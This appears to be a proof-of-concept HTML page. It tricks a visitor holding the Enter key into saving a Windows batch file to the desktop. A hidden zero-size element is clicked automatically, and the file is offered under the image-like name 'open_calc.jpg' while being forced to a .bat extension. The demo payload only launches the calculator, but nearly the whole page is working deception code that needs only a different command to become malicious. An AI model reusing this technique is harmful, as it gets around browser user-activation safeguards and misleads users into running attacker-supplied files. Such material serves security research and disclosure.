<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Demo Save BAT to Desktop</title>
    <style>
        body {
            background: #1d306d;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            color: white;
            font-family: sans-serif;
        }
        h1, h2 {
            text-align: center;
        }
        #pixel {
            width: 0;
            height: 0;
        }
    </style>
</head>
<body>

    <div id="pixel"></div>
    <h1>ðŸŽ® Hold ENTER to Generate File</h1>
    <h2>File akan membuka Kalkulator saat dijalankan</h2>
    <h2 id="status"></h2>

    <script>
        let countEnter = 0;
        let isDownloaded = false;

        window.onload = () => {
            const pixel = document.querySelector('#pixel');
            const status = document.querySelector('#status');
            const body = document.body;

            body.onkeydown = e => (e.key === "Enter") ? clickedEnter() : null;
            body.onkeyup = e => (e.key === "Enter") ? cancelEnter() : null;

            pixel.addEventListener('click', async () => {
                const options = {
                    startIn: 'desktop',
                    suggestedName: 'open_calc.jpg',
                    types: [{
                        description: 'Batch file',
                        accept: { 'text/plain': ['.bat'] }
                    }],
                    excludeAcceptAllOption: true
                };

                const handle = await window.showSaveFilePicker(options);
                const writable = await handle.createWritable();
                const fileContent = "start calc.exe";
                const blob = new Blob([fileContent], { type: "text/plain" });
                await blob.stream().pipeTo(writable);

                status.textContent = "âœ… File berhasil dibuat. Klik file untuk menjalankan kalkulator.";
            });
        };

        function clickedEnter() {
            countEnter++;
            if (countEnter > 5 && !isDownloaded) {
                document.querySelector("#pixel").click();
                isDownloaded = true;
            }
        }

        function cancelEnter() {
            countEnter = 0;
        }
    </script>

</body>
</html>
